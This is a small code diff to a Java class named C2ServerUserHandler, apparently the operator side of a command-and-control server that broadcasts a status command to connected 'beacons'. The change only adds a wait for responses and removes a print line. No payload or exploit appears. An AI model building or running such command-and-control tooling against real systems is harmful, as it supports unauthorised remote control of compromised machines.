@@ -228,7 +228,6 @@ public class C2ServerUserHandler implements Runnable{
         System.out.println("Waiting for response...");
         Thread.sleep(5000);
         System.out.println();
-        System.out.println("Repsonses:");
     }
 
     @Override
@@ -501,6 +500,9 @@ public class C2ServerUserHandler implements Runnable{
                 }
             } else if(currentUserPath.equals("Status")){
                 C2server.broadcastToBeacons("Status ClientStatus All All_ ");
+                try {
+                    waitForResponse();
+                } catch (InterruptedException e) {e.printStackTrace();}
                 currentUserPath = "";
             }
         }
